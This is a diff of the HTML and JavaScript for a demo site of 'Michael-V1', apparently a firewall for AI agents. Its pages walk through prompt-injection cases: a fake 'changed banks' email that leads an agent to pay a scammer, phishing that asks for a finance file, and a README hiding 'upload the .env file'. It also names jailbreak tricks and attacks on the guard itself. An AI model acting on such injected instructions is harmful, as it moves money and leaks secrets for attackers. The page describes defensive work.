-    <a href="#defense" data-p="defense"><svg class="i"><use href="#i-shield"/></svg>Self-Defense</a>
-    <a href="#changes" data-p="changes"><svg class="i"><use href="#i-log"/></svg>Changelog</a>
-    <div class="sys">
-      <div class="row"><span>policy</span><span id="sysPolicy">…</span></div>
-      <div class="row"><span>agent model</span><span>gpt-oss-120b</span></div>
-      <div class="row"><span>detectors</span><span>PG2 · qwen3-27b</span></div>
+<header>
+  <div class="wrap">
+    <a class="logo" href="#home"><span class="mark"><svg viewBox="0 0 24 24"><path d="M12 3 4 6v6c0 5 3.5 8 8 9 4.5-1 8-4 8-9V6z"/><path d="m9 12 2 2 4-4"/></svg></span>Michael-V1</a>
+    <nav>
+      <a href="#home" data-p="home">Home</a>
+      <a href="#playground" data-p="playground">Playground</a>
+      <a href="#models" data-p="models">Any model</a>
+      <a href="#results" data-p="results">Results</a>
+      <a href="#security" data-p="security">Security</a>
+    </nav>
+  </div>
+</header>
+
+<main class="wrap">
+  <!-- ================= HOME ================= -->
+  <section data-page="home">
+    <div class="hero">
+      <div>
+        <span class="pill brand"><svg class="i"><use href="#i-shield"/></svg>Firewall for AI agents · works with any model</span>
+        <h1>One email can hijack your AI agent. <span class="grad-text">Michael-V1 stops it.</span></h1>
+        <p>AI assistants now read your inbox and then <b>act</b>: they send email, pay invoices and share files. Before any action runs, Michael-V1 asks one question: <b>did you ask for this, or did something the AI read?</b></p>
+        <div class="ctas"><a class="btn primary" href="#playground"><svg class="i"><use href="#i-play"/></svg>See it stop an attack</a><a class="btn" href="#models"><svg class="i"><use href="#i-code"/></svg>Use it with your model</a></div>
+      </div>
+      <div class="card heroviz">
+        <svg viewBox="0 0 500 300" role="img" aria-label="A fake bank-change email tries to make the AI pay a scammer; Michael-V1 blocks it">
+          <text x="18" y="24" font-family="Inter" font-size="11" font-weight="600" fill="#94a3b8" letter-spacing="1.5">A REAL RECORDED ATTACK</text>
+          <rect x="14" y="40" width="190" height="78" rx="14" fill="#fff1f2" stroke="#fecdd3"/>
+          <text x="30" y="66" font-family="Inter" font-size="12" font-weight="700" fill="#e11d48">INCOMING EMAIL</text>
+          <text x="30" y="86" font-family="Inter" font-size="12.5" fill="#334155">“We changed banks. Pay</text>
+          <text x="30" y="104" font-family="Inter" font-size="12.5" fill="#334155">to account 3333-9999”</text>
+          <rect x="14" y="180" width="190" height="62" rx="14" fill="#eef2ff" stroke="#c7d2fe"/>
+          <text x="30" y="205" font-family="Inter" font-size="12" font-weight="700" fill="#4f46e5">YOU</text>
+          <text x="30" y="225" font-family="Inter" font-size="12.5" fill="#334155">“Pay my overdue invoices”</text>
+          <path d="M204 80 C 240 80, 250 150, 270 150" fill="none" stroke="#fecdd3" stroke-width="3"/>
+          <path d="M204 210 C 240 210, 250 150, 270 150" fill="none" stroke="#c7d2fe" stroke-width="3"/>
+          <circle cx="290" cy="150" r="30" fill="#fff" stroke="#e5e8f0" stroke-width="2"/>
+          <text x="290" y="146" text-anchor="middle" font-family="Inter" font-size="11" font-weight="700" fill="#334155">AI</text>
+          <text x="290" y="161" text-anchor="middle" font-family="Inter" font-size="10" fill="#64748b">agent</text>
+          <path d="M320 150 H 380" stroke="#fecdd3" stroke-width="3" stroke-dasharray="5 5"/>
+          <g class="shieldpulse"><path d="M405 118 l26 9 v20 c0 18 -12 28 -26 33 c-14 -5 -26 -15 -26 -33 v-20 z" fill="url(#g1)"/>
+            <path d="M396 150 l6 6 12 -13" fill="none" stroke="#fff" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"/></g>
+          <text x="405" y="200" text-anchor="middle" font-family="Inter" font-size="11" font-weight="700" fill="#4f46e5">Michael-V1</text>
+          <path d="M405 206 V 222" stroke="#c7d2fe" stroke-width="2" stroke-dasharray="3 4"/>
+          <rect x="300" y="226" width="186" height="62" rx="14" fill="#fff" stroke="#e5e8f0"/>
+          <text x="316" y="250" font-family="Inter" font-size="12" font-weight="700" fill="#0f172a">Pay ₹12,000 → 3333-9999</text>
+          <text x="316" y="270" font-family="Inter" font-size="11.5" fill="#64748b">account came from the email</text>
+          <g class="stampanim"><rect x="392" y="240" width="88" height="30" rx="6" fill="#fff" stroke="#e11d48" stroke-width="3"/>
+            <text x="436" y="261" text-anchor="middle" font-family="Inter" font-size="14" font-weight="800" fill="#e11d48">BLOCKED</text></g>
+          <circle r="7" fill="#e11d48" class="packet"/>
+        </svg>
+      </div>
     </div>
-  </aside>
+    <div class="stats" id="stats"></div>
 
-  <main>
-    <section data-page="overview">
-      <div class="pagehead"><div><div class="crumb">Overview</div><h1>A firewall between AI agents and the real world</h1>
-        <p>AI agents read emails, web pages and files, then act: they send email, move money, share files. Michael-V1 checks every action <b>before</b> it runs and traces its target back to <b>who asked for it</b>: the user, or something the agent read.</p></div></div>
-      <div class="grid g5" id="kpis"></div>
-      <div class="panel" style="margin-top:14px">
-        <div class="ph"><h3>The 30-second story</h3><span class="sub">a real recorded run</span></div>
-        <div class="story" id="story"></div>
-      </div>
-      <div class="panel pipe" style="margin-top:14px">
-        <div class="ph"><h3>How a request flows through Michael-V1</h3><span class="sub">avg measured time each gate adds</span></div>
-        <div class="pb" id="pipeline"></div>
-      </div>
-      <div class="panel" style="margin-top:14px">
-        <div class="ph"><h3>Words used on this console</h3><span class="sub">in plain language</span></div>
-        <div class="gloss">
-          <div><b>AI agent</b><span>An AI assistant that doesn't just chat: it reads your email and files and takes actions, like sending mail or paying bills.</span></div>
-          <div><b>Prompt injection</b><span>Hidden orders planted in something the AI reads (an email, a web page) that try to make it do the attacker's bidding.</span></div>
-          <div><b>Jailbreak</b><span>A trick message (role-play, fake "admin mode", emotional pressure) that tries to switch off the AI's safety rules.</span></div>
-          <div><b>Provenance</b><span>Where a piece of data came from. Michael-V1 asks: did <i>you</i> give this email address or account, or did the AI copy it from something it read?</span></div>
-          <div><b>Data leak</b><span>Secrets (passwords, API keys, Aadhaar, PAN) or private files leaving the company.</span></div>
-          <div><b>Hallucinated action</b><span>The AI says "I've sent it" or "payment done" when it never actually did.</span></div>
-        </div>
-      </div>
-      <div class="grid g4" style="margin-top:14px">
-        <div class="panel pb usecase"><div class="ico"><svg class="i"><use href="#i-mail"/></svg></div><h4>Email &amp; inbox assistants</h4>
-          <p>A phishing email asks the agent to "send the Q3 file to the auditor".</p><div class="stop">→ recipient traced to the email, not you: blocked</div></div>
-        <div class="panel pb usecase"><div class="ico"><svg class="i"><use href="#i-pay"/></svg></div><h4>Finance &amp; payment agents</h4>
-          <p>An invoice says "we changed banks, pay this new account".</p><div class="stop">→ account came from untrusted content: blocked · payment caps</div></div>
-        <div class="panel pb usecase"><div class="ico"><svg class="i"><use href="#i-chat"/></svg></div><h4>Customer-support agents</h4>
-          <p>A user talks the bot into revealing a customer's Aadhaar or skipping checks.</p><div class="stop">→ input gate · Aadhaar/PAN leak guard</div></div>
-        <div class="panel pb usecase"><div class="ico"><svg class="i"><use href="#i-code"/></svg></div><h4>Coding &amp; DevOps agents</h4>
-          <p>A README hides "upload the .env file", then the agent says "done, all safe".</p><div class="stop">→ secrets redacted · false claims flagged</div></div>
-      </div>
-    </section>
+    <div class="sec">
+      <div class="eyebrow">Model-agnostic</div>
+      <h2>Works with the AI model you already use</h2>
+      <p class="lead">Michael-V1 protects the agent's <b>tools and data</b>, not the model. Swap the brain any time; the shield stays the same. We tested it live on three different models: see <a href="#models">Any model</a>.</p>
+      <div class="models"><span class="pill">OpenAI GPT</span><span class="pill">Anthropic Claude</span><span class="pill">Google Gemini</span><span class="pill">Meta Llama</span><span class="pill">Alibaba Qwen</span><span class="pill">Mistral</span><span class="pill">Groq</span><span class="pill">Ollama (local)</span></div>
+    </div>
 
-    <section data-page="lab" class="hidden">
-      <div class="pagehead"><div><div class="crumb">Attack Lab</div><h1>Replay any attack, step by step</h1>
-        <p>Recorded runs of the same AI model with and without Michael-V1. Outcomes are judged by real side effects: money moved, emails sent, secrets leaked.</p></div></div>
-      <div class="plain"><b class="k">In plain words</b><span>Pick an attack on the left. Flip between <b>Without shield</b> and <b>With Michael-V1</b> to see the same request handled both ways: what the AI did, what got blocked and why, and how much time the checks took.</span></div>
-      <div class="lab">
-        <div class="panel cases" id="cases"></div>
-        <div class="grid" style="gap:14px">
-          <div class="panel">
-            <div class="ph" style="flex-wrap:wrap">
-              <div style="min-width:0"><h3 id="cTitle">-</h3><div class="sub" id="cMeta"></div></div>
-              <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
-                <div class="seg" id="modeSeg"><button data-m="off" class="off-mode">Without shield</button><button data-m="on" class="on-mode on">With Michael-V1</button></div>
-                <button class="btn" id="liveBtn"><svg class="i"><use href="#i-play"/></svg>Run live</button>
-              </div>
-            </div>
-            <div class="pb" style="padding-bottom:12px"><div class="prompt" id="cPrompt"></div></div>
-            <div class="what" id="what"></div>
-            <div class="dmg" id="dmg" style="border-top:1px solid var(--line)"></div>
-          </div>
-          <div class="panel"><div class="ph"><h3>Trust flow</h3><span class="sub">where each action's target came from · red = untrusted source</span></div><div class="pb" id="flow" style="max-width:900px;margin:0 auto"></div></div>
-          <div class="panel"><div class="ph"><h3>Latency waterfall</h3><span class="sub" id="wfSum"></span></div><div class="pb wf" id="wf"></div></div>
-          <div class="grid g2">
-            <div class="panel"><div class="ph"><h3>Decision log</h3><span id="audit"></span></div><div class="log" id="log"></div></div>
-            <div class="panel"><div class="ph"><h3>Answer shown to the user</h3><span class="sub" id="claimSum"></span></div><div class="pb"><div class="answer" id="answer" style="max-height:340px"></div></div></div>
-          </div>
-        </div>
+    <div class="sec">
+      <div class="eyebrow">How it works</div>
+      <h2>Three checks, milliseconds each</h2>
+      <p class="lead">You don't change your model or your prompts. Michael-V1 sits around the agent's tools.</p>
+      <div class="steps3">
+        <div class="card pad step"><div class="n">1</div><h3>Read safely</h3><p>Emails, web pages and files are scanned the moment they arrive. Hidden instructions are quarantined and secrets are hidden before the AI reads them.</p></div>
+        <div class="card pad step"><div class="n">2</div><h3>Act only on your orders</h3><p>Before an email, payment or file share, the target is traced to its source. If it came from something the AI read, and not from you, it's blocked.</p></div>
+        <div class="card pad step"><div class="n">3</div><h3>Tell the truth</h3><p>If the AI says "I've sent it" or "payment done", Michael-V1 checks the real action log and warns you when it never happened.</p></div>
       </div>
-    </section>
+    </div>
 
-    <section data-page="benchmark" class="hidden">
-      <div class="pagehead"><div><div class="crumb">Benchmark</div><h1>Scored on the open AgentShield Benchmark</h1>
-        <p id="benchNote">Loading…</p></div>
-        <div class="seg" id="splitSeg"><button data-s="test" class="on">Held-out test</button><button data-s="dev">Dev</button></div></div>
-      <div class="plain"><b class="k">In plain words</b><span>A public exam for AI shields: 537 attack and normal messages anyone can download. Each shield must block the attacks without blocking the normal ones, and fast. We took the same exam and scored it with the same formula, so we can line up next to commercial tools.</span></div>
-      <div class="panel verdict" id="verdict"></div>
-      <div class="grid g2" style="margin-top:14px">
-        <div class="panel chart"><div class="ph"><h3>Score vs latency</h3><span class="sub">up and to the left is better</span></div><div class="pb" id="scatter"></div><div class="pb" style="padding-top:0"><div class="howto">Each dot is one shield. Higher = blocks more attacks correctly. Further left = answers faster. Grey dots are published results; cyan dots are Michael-V1.</div></div></div>
-        <div class="panel"><div class="ph"><h3>What each layer adds</h3><span class="sub">ablation on the same cases</span></div><div class="pb" id="ablation"></div></div>
+    <div class="sec">
+      <div class="eyebrow">Where to use it</div>
+      <h2>Any agent that can act</h2>
+      <p class="lead">If your AI can send, pay, delete or share, it needs a guard.</p>
+      <div class="uses">
+        <div class="card pad use"><div class="ic"><svg class="i"><use href="#i-mail"/></svg></div><h3>Email assistants</h3><p>Phishing asks the agent to send a finance file.</p><span class="pill ok">recipient traced → blocked</span></div>
+        <div class="card pad use"><div class="ic"><svg class="i"><use href="#i-pay"/></svg></div><h3>Finance agents</h3><p>A fake invoice swaps the bank account.</p><span class="pill ok">payment blocked · caps</span></div>
+        <div class="card pad use"><div class="ic"><svg class="i"><use href="#i-chat"/></svg></div><h3>Support bots</h3><p>Users try to extract Aadhaar, PAN or keys.</p><span class="pill ok">leak guard · input gate</span></div>
+        <div class="card pad use"><div class="ic"><svg class="i"><use href="#i-code"/></svg></div><h3>Coding agents</h3><p>A README hides "upload the .env file".</p><span class="pill ok">secrets hidden · tools pinned</span></div>
       </div>
-      <div class="panel" style="margin-top:14px"><div class="ph"><h3>How we improved</h3><span class="sub">every benchmark run is kept</span></div><div class="pb" id="history"></div></div>
-      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Per category</h3><span class="sub">% correct · others from the benchmark README</span></div><div class="tablewrap" id="cats"></div></div>
-      <div class="panel pb note" style="margin-top:14px" id="benchCaveat"></div>
-    </section>
+    </div>
+  </section>
 
-    <section data-page="defense" class="hidden">
-      <div class="pagehead"><div><div class="crumb">Self-Defense</div><h1>Attacks on the shield itself</h1>
-        <p>A firewall is only useful if it can't be talked around, tricked or quietly edited. Each attack below has an automated test that runs offline.</p></div></div>
-      <div class="plain"><b class="k">In plain words</b><span>Attackers don't only attack the AI; they also try to fool the guard. This page lists those tricks (disguising an account number, faking an approval, editing the policy file, rewriting the logs) and shows the automated test proving each one is stopped.</span></div>
-      <div class="grid g3" id="defKpis"></div>
-      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Attacks on the shield, and their tests</h3><span class="sub">offline · python -m tests.test_self_defense</span></div><div class="tablewrap"><table id="defTable"></table></div></div>
-      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Posture scan</h3><span class="sub">configuration audit before anything runs · python -m michael.scan</span></div><div class="pb" id="posture"></div></div>
-      <div class="panel" style="margin-top:14px"><div class="ph"><h3>Attack coverage map</h3><span class="sub">OWASP Agentic Top 10 · OWASP LLM Top 10 · MCP attacks · attacks on the shield</span></div>
-        <div class="pb" style="padding-bottom:6px"><div class="seg" id="covSeg"></div></div><div class="tablewrap"><table id="covTable"></table></div></div>
-    </section>
+  <!-- ================= PLAYGROUND ================= -->
+  <section data-page="playground" class="hidden">
+    <div class="sec" style="padding-top:40px">
+      <div class="eyebrow">Playground</div>
+      <h2>Watch the same request, with and without Michael-V1</h2>
+      <p class="lead">Pick an AI model and a situation. Both sides use the same model and the same inbox; only the shield is different. These are real recorded runs.</p>
+      <div class="card pad pickers">
+        <div><div class="label">1 · AI model</div><div class="chips" id="modelChips"></div></div>
+        <div><div class="label">2 · Situation</div><div class="chips" id="caseChips"></div></div>
+      </div>
+      <div class="duo" id="duo"></div>
+      <div style="margin-top:16px;display:flex;gap:10px;align-items:center;flex-wrap:wrap">
+        <button class="btn primary" id="liveBtn"><svg class="i"><use href="#i-bolt"/></svg>Run it live now</button>
+        <span class="small" id="liveNote"></span>
+      </div>
+    </div>
+  </section>
 
-    <section data-page="changes" class="hidden">
-      <div class="pagehead"><div><div class="crumb">Changelog</div><h1>What changed and what it bought us</h1>
-        <p>Every improvement came from a measured failure: the attack suite, the jailbreak eval, the benchmark or a latency trace.</p></div></div>
-      <div class="panel pb"><div class="tl" id="tl"></div></div>
-    </section>
-  </main>
-</div>
+  <!-- ================= ANY MODEL ================= -->
+  <section data-page="models" class="hidden">
+    <div class="sec" style="padding-top:40px">
+      <div class="eyebrow">Same shield, every model</div>
+      <h2>Different AI brains fall for different tricks. The shield doesn't care.</h2>
+      <p class="lead">The same attacks, run on three different AI models, each without and with Michael-V1. Click any cell to watch it in the playground.</p>
+      <div class="card matrix" id="matrix"></div>
+    </div>
+    <div class="sec">
+      <div class="eyebrow">Plug it in</div>
+      <h2>Add it to your agent in a few lines</h2>
+      <p class="lead">Wrap your tools once. Use any model, any framework: the tool calls go through Michael-V1 either way.</p>
+      <div class="tabs" id="codeTabs"></div>
+      <pre class="code" id="code"></pre>
+    </div>
+  </section>
+
+  <!-- ================= RESULTS ================= -->
+  <section data-page="results" class="hidden">
+    <div class="sec" style="padding-top:40px">
+      <div class="eyebrow">Results</div>
+      <h2>Tested on a public benchmark and on real damage</h2>
+      <p class="lead" id="benchLead">Loading…</p>
+      <div class="card pad score" id="verdict"></div>
+      <div class="g2" style="margin-top:18px">
+        <div class="card pad chart"><div class="label">Score vs speed · up and left is better</div><div id="scatter"></div><div class="small" style="margin-top:8px">Each grey dot is a published AI shield. Michael-V1 is the large blue dot.</div></div>
+        <div class="card pad"><div class="label">Our attack suite · real side effects</div><div id="suite"></div></div>
+      </div>
+      <div class="card" style="margin-top:18px"><div class="pad" style="padding-bottom:6px"><div class="label">Per category · % handled correctly</div></div><div class="tablewrap" id="cats"></div></div>
+      <p class="small" id="benchNote" style="margin-top:14px"></p>
+    </div>
+  </section>
+
+  <!-- ================= SECURITY ================= -->
+  <section data-page="security" class="hidden">
+    <div class="sec" style="padding-top:40px">
+      <div class="eyebrow">Security</div>
+      <h2>A guard that can't be fooled itself</h2>
+      <p class="lead">Attackers also go after the guard: disguised account numbers, fake approvals, edited policy files, poisoned tools. Every trick below has an automated test.</p>
+      <div class="g3" id="secStats"></div>
+      <div class="card" style="margin-top:18px"><div class="tablewrap"><table id="defTable"></table></div></div>
+    </div>
+    <div class="sec">
+      <div class="eyebrow">Coverage</div>
+      <h2>Mapped to the official threat lists</h2>
+      <p class="lead">OWASP Top 10 for Agentic Applications, OWASP Top 10 for LLM Applications, MCP tool attacks, and attacks on the shield. Honest status for each.</p>
+      <div class="tabs" id="covTabs"></div>
+      <div class="card"><div class="tablewrap"><table id="covTable"></table></div></div>
+    </div>
+  </section>
+
+  <footer>Michael-V1 · runtime firewall for AI agents · Track 2: Safe &amp; Trustworthy AI. All tools in this demo are mocked: no real email or payment is ever sent. Benchmark numbers are self-run with the public AgentShield Benchmark's scoring formula, not an official leaderboard entry.</footer>
+</main>
 
 <script>
 const $ = (s) => document.querySelector(s);
@@ -329,401 +338,277 @@ const esc = (t) => String(t ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<
 const cut = (t, n) => (t = String(t ?? ""), t.length > n ? t.slice(0, n - 1) + "…" : t);
 const inr = (n) => "₹" + Math.round(Number(n) || 0).toLocaleString("en-IN");
 const ms = (v) => v == null ? "-" : v < 1 ? v.toFixed(2) + " ms" : v < 1000 ? Math.round(v) + " ms" : (v / 1000).toFixed(1) + " s";
-const CAT = { injection: "Prompt injection", jailbreak: "Jailbreak", leakage: "Data leakage", unsafe_tool: "Unsafe tool use", hallucination: "Hallucination", benign: "Normal tasks" };
-const BCAT = { "prompt-injection": "Prompt injection", jailbreak: "Jailbreak", "data-exfiltration": "Data exfiltration", "tool-abuse": "Tool abuse", "over-refusal": "Legit requests allowed", "multi-agent": "Multi-agent", "provenance-audit": "Provenance & audit" };
-const HIGH = new Set(["send_email", "make_payment"]);
-const S = { score: null, bench: null, def: null, sel: null, mode: "on", live: null, split: "test" };
+const icon = (id) => `<svg class="i"><use href="#i-${id}"/></svg>`;
+const S = { score: null, models: null, bench: null, def: null, model: null, caseId: "tool-changed-bank", live: {} };
+const DEFAULT_MODEL = "openai/gpt-oss-120b";
+const CAT = { injection: "Prompt injection", jailbreak: "Jailbreak", leakage: "Data leak", unsafe_tool: "Unsafe tool use", hallucination: "False claims", benign: "Normal task" };
 
 function route() {
-  const p = (location.hash || "#overview").slice(1);
+  const p = (location.hash || "#home").slice(1);
   document.querySelectorAll("[data-page]").forEach((s) => s.classList.toggle("hidden", s.dataset.page !== p));
-  document.querySelectorAll(".nav a").forEach((a) => a.classList.toggle("on", a.dataset.p === p));
+  document.querySelectorAll("nav a").forEach((a) => a.classList.toggle("on", a.dataset.p === p));
   window.scrollTo(0, 0);
 }
-addEventListener("hashchange", route);
-route();  // show the right page at once, before data arrives
+addEventListener("hashchange", route); route();
 
-const getJSON = (u) => fetch(u).then((r) => r.ok ? r.json() : null).catch(() => null);
-Promise.all([getJSON("/api/scorecard"), getJSON("/api/benchmark"), getJSON("/api/selfdefense")]).then(([score, bench, def]) => {
-  Object.assign(S, { score, bench, def });
-  if (bench && !bench.test?.configs && bench.dev?.configs) S.split = "dev";
-  $("#sysPolicy").innerHTML = def?.policy?.ok ? `<span class="dot" style="background:var(--ok)"></span>pinned` : `<span class="dot" style="background:var(--bad)"></span>check`;
-  renderOverview(); renderCases(); renderBench(); renderDefense(); renderChanges();
-  const first = score?.results?.find((r) => r.id === "tool-changed-bank") ? "tool-changed-bank" : score?.results?.[0]?.id;
-  if (first) select(first);
-  route();
+const get = (u) => fetch(u).then((r) => r.ok ? r.json() : null).catch(() => null);
+Promise.all([get("/api/scorecard"), get("/api/models"), get("/api/benchmark"), get("/api/selfdefense")]).then(([score, models, bench, def]) => {
+  Object.assign(S, { score, models, bench, def });
+  S.model = Object.keys(models?.models || {})[0] || DEFAULT_MODEL;
+  renderStats(); renderPicker(); renderPlayground(); renderMatrix(); renderCode("sdk"); renderResults(); renderSecurity();
 });
 
-// ---------------- overview ----------------
-const TIPS = { "Attacks stopped": "Out of our 25 attack scenarios, how many caused no real damage with Michael-V1 switched on.", "Normal tasks working": "Ordinary requests that must still work. A blocked normal task is a false alarm.", "Avg added latency": "Extra time Michael-V1 adds to a whole task, measured on recorded runs.", "Benchmark score": "Score on the public AgentShield Benchmark (0-100), same formula as the published leaderboard.", "Self-defense tests": "Automated tests that try to trick or tamper with the shield itself." };
-const kpi = (l, v, d, cls = "") => `<div class="panel kpi" title="${esc(TIPS[l] || "")}"><div class="l">${l}</div><div class="v ${cls}">${v}</div><div class="d">${d}</div></div>`;
-function benchFinal() {
-  const b = S.bench?.[S.split] || S.bench?.test || S.bench?.dev;
-  return b ? { v: b.configs["Michael-V1 gate (full)"].final, split: b.split, n: b.cases } : null;
-}
-function renderOverview() {
-  const s = S.score?.summary, b = benchFinal(), d = S.def?.tests?.results || [];
-  $("#kpis").innerHTML =
-    kpi("Attacks stopped", s ? `${s.attacks_total - s.attacks_succeeded_on}<small> / ${s.attacks_total}</small>` : "-", s ? `${s.attacks_succeeded_off} got through with no shield` : "run the suite", "up") +
-    kpi("Normal tasks working", s ? `${s.benign_ok_on}<small> / ${s.benign_total}</small>` : "-", "false alarms: " + (s ? s.benign_total - s.benign_ok_on : "-")) +
-    kpi("Avg added latency", s ? `${s.avg_shield_ms}<small> ms</small>` : "-", s ? `per task, vs ${(s.avg_llm_ms / 1000).toFixed(1)} s of AI time` : "", "acc") +
-    kpi("Benchmark score", b ? `${b.v}<small> / 100</small>` : "-", b ? `AgentShield corpus · ${b.split} split` : "not run yet") +
-    kpi("Self-defense tests", d.length ? `${d.filter((x) => x.passed).length}<small> / ${d.length}</small>` : "-", "attacks on the shield itself", "up");
-  $("#pipeline").innerHTML = pipelineSvg();
-  renderStory();
-}
-function renderStory() {
-  const r = S.score?.results?.find((x) => x.id === "tool-changed-bank") || S.score?.results?.find((x) => x.off?.damage?.money_moved > 0);
-  const s = S.score?.summary;
-  if (!r) { $("#story").innerHTML = `<div class="empty" style="grid-column:1/-1">Run the attack suite to see a recorded story: <code>python -m michael.suite</code></div>`; return; }
-  const offD = r.off.damage, a = (r.on.flow?.actions || []).find((x) => x.status === "blocked");
-  const acct = offD.payments[0]?.account || a?.target || "an unknown account";
-  $("#story").innerHTML = `
-    <div><div class="n">01 · WITHOUT PROTECTION</div><h4>The AI pays a scammer</h4>
-      <p>You say: “${esc(cut(r.prompt, 60))}”. An email in the inbox says the vendor “changed banks”. The AI believes it and pays.</p>
-      <div class="big" style="color:var(--bad)">${inr(offD.money_moved)} lost</div></div>
-    <div><div class="n">02 · WITH MICHAEL-V1</div><h4>The payment is stopped</h4>
-      <p>Before paying, Michael-V1 asks: <b>who chose account ${esc(acct)}?</b> Not you; it came from an email. So the payment is blocked and the AI asks you to confirm.</p>
-      <div class="big" style="color:var(--ok)">₹0 lost</div></div>
-    <div><div class="n">03 · WHAT IT COSTS</div><h4>You won't notice it</h4>
-      <p>The checks run while the AI is thinking. Across all recorded tasks the shield added this much time on average:</p>
-      <div class="big" style="color:var(--accent)">${s ? s.avg_shield_ms + " ms" : "-"} <small style="font-size:14px;color:var(--muted)">vs ${s ? (s.avg_llm_ms / 1000).toFixed(1) + " s" : "-"} AI time</small></div></div>`;
-}
-function pipelineSvg() {
-  const on = (S.score?.results || []).map((r) => r.on.trace || []);
-  const avg = (check) => { const v = on.flatMap((t) => t.filter((e) => e.kind === "shield_timing" && e.check === check).map((e) => e.ms)); return v.length ? v.reduce((a, b) => a + b, 0) / v.length : null; };
-  const lat = { gate: avg("check_user_prompt"), read: avg("process_tool_result"), act: avg("check_tool_call"), out: avg("check_final_answer") };
-  const box = (x, y, w, h, title, sub, gate) => `<g><rect x="${x}" y="${y}" width="${w}" height="${h}" rx="10" fill="${gate ? "rgba(34,211,238,.06)" : "var(--panel2)"}" stroke="${gate ? "var(--accent)" : "var(--line2)"}" stroke-width="1.2"/>
-      <text x="${x + 14}" y="${y + 24}" fill="var(--text)" font-size="13" font-weight="600">${title}</text>
-      ${sub.map((t, i) => `<text x="${x + 14}" y="${y + 42 + i * 15}" fill="var(--muted)" font-size="11" font-family="JetBrains Mono, monospace">${t}</text>`).join("")}</g>`;
-  const badge = (x, y, v) => v == null ? "" : `<g><rect x="${x}" y="${y}" width="84" height="20" rx="5" fill="var(--bg)" stroke="var(--accent)" stroke-opacity=".55"/><text x="${x + 42}" y="${y + 14}" text-anchor="middle" fill="var(--accent)" font-size="11" font-family="JetBrains Mono, monospace">+${ms(v)}</text></g>`;
-  const ln = (d, c = "var(--accent)") => `<path d="${d}" fill="none" stroke="${c}" stroke-width="1.6" class="flowline" marker-end="url(#arr)"/>`;
-  const lbl = (x, y, t, anchor = "middle") => `<text x="${x}" y="${y}" text-anchor="${anchor}" fill="var(--faint)" font-size="10.5" font-family="JetBrains Mono, monospace">${t}</text>`;
-  const lane = (y, t) => `<text x="12" y="${y}" fill="var(--faint)" font-size="9.5" font-family="JetBrains Mono, monospace" letter-spacing="1.5">${t}</text>`;
-  // three lanes: request (top), action (middle), read-back (bottom)
-  return `<svg viewBox="0 0 1100 380" font-family="Inter, sans-serif" role="img" aria-label="Michael-V1 request pipeline">
-    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="var(--accent)"/></marker></defs>
-    ${lane(30, "REQUEST")}${lane(178, "ACTION")}${lane(318, "READ-BACK")}
-    ${box(20, 45, 140, 70, "User", ["prompt", "trusted source"])}
-    ${box(210, 45, 230, 70, "1 · Input gate", ["rules · de-obfuscation", "Prompt Guard ‖ policy judge"], true)}
-    ${box(490, 45, 190, 70, "AI agent", ["plans tool calls", "gpt-oss-120b"])}
-    ${box(730, 45, 200, 70, "3 · Answer check", ["“I did X” vs action log", "secret redaction"], true)}
-    ${box(980, 45, 100, 70, "Reply", ["to user"])}
-    ${box(490, 190, 190, 85, "2 · Action gate", ["provenance trace", "look-alike · data-leak", "limits · fail closed"], true)}
-    ${box(730, 190, 200, 85, "Tools", ["send email · pay", "read inbox · files · web"])}
-    ${box(210, 300, 230, 60, "0 · Scan on arrival", ["quarantine · redact · strip"], true)}
-    ${ln("M160 80 H206")}${ln("M440 80 H486")}${ln("M680 80 H726")}${ln("M930 80 H976")}
-    ${ln("M585 115 V186")}${lbl(592, 158, "tool call", "start")}
-    ${ln("M680 232 H726")}${lbl(703, 288, "if allowed")}
-    ${ln("M830 275 V330 H444")}${lbl(640, 322, "emails · files · web pages (untrusted)")}
-    ${ln("M325 300 V250 C325 160 450 150 520 117")}${lbl(332, 238, "clean content", "start")}
-    ${badge(283, 18, lat.gate)}${badge(543, 162 - 4 + 120, lat.act)}${badge(283, 270, lat.read)}${badge(788, 18, lat.out)}
-    <text x="20" y="374" fill="var(--faint)" font-size="10.5" font-family="JetBrains Mono, monospace">every event → hash-chained audit log · policy pinned by SHA-256 · ‖ = parallel, while the AI thinks</text>
-  </svg>`;
+// ---------- home ----------
+function renderStats() {
+  const s = S.score?.summary, b = S.bench?.test?.configs?.["Michael-V1 gate (full)"], d = S.def?.tests?.results || [], p = S.def?.posture;
+  const stat = (v, l) => `<div class="card stat"><div class="v">${v}</div><div class="l">${l}</div></div>`;
+  $("#stats").innerHTML =
+    stat(`<span class="grad-text">${b ? b.final : "-"}</span>`, "benchmark score / 100 (held-out)") +
+    stat(b ? `${Math.round(b.latency.p50)} ms` : "-", "typical check time") +
+    stat(s ? `${s.attacks_succeeded_on}/${s.attacks_total}` : "-", `attacks got through (${s ? s.attacks_succeeded_off : "-"} without the shield)`) +
+    stat(d.length ? `${d.filter((x) => x.passed).length}/${d.length}` : "-", "attacks on the shield blocked") +
+    stat(p ? p.grade : "-", "security posture grade");
 }
 
-// ---------------- lab ----------------
-function renderCases() {
-  const rs = S.score?.results || [], groups = {};
-  rs.forEach((r) => (groups[r.category] ||= []).push(r));
-  const sq = (run) => !run ? "" : `<i class="${run.result === "attack_succeeded" || run.result === "false_alarm" ? "bad" : run.result === "error" ? "warn" : "ok"}"></i>`;
-  $("#cases").innerHTML = Object.entries(groups).map(([c, list]) => `<div class="grp">${CAT[c] || c} · ${list.length}</div>` +
-    list.map((r) => `<button class="case" data-id="${r.id}"><span>${esc(r.title)}</span><span class="pair" title="without shield / with Michael-V1">${sq(r.off)}${sq(r.on)}</span></button>`).join("")).join("")
-    || `<div class="pb muted">No recorded runs yet. Run <span class="mono">python -m michael.suite</span>.</div>`;
-  document.querySelectorAll(".case").forEach((b) => b.onclick = () => select(b.dataset.id));
+// ---------- playground ----------
+function cases() {
+  const fromModels = [...new Set(Object.values(S.models?.runs || {}).map((r) => r.case))];
+  const all = (S.score?.results || []).map((r) => r.id);
+  return [...fromModels, ...all.filter((x) => !fromModels.includes(x))];
 }
-function select(id) {
-  S.sel = id; S.live = null;
